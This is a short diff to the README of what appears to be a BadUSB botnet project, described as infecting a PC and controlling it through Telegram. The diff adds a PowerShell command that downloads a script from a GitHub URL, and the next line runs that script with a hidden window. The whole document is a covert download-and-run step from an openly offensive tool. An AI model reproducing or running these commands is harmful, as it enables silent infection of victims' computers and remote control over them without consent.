@@ -2,6 +2,7 @@
 :smiling_imp::busts_in_silhouette: Infect a pc with badusb and establish a connection through telegram.
 
 ```
+> (new-object net.webclient).DownloadFile('https://github.com/alexfrancow/badusb_botnet/blob/master/poc.ps1','poc.ps1')
 > powershell.exe -windowstyle hidden -file poc.ps1
 ```
 #### Telegram Options
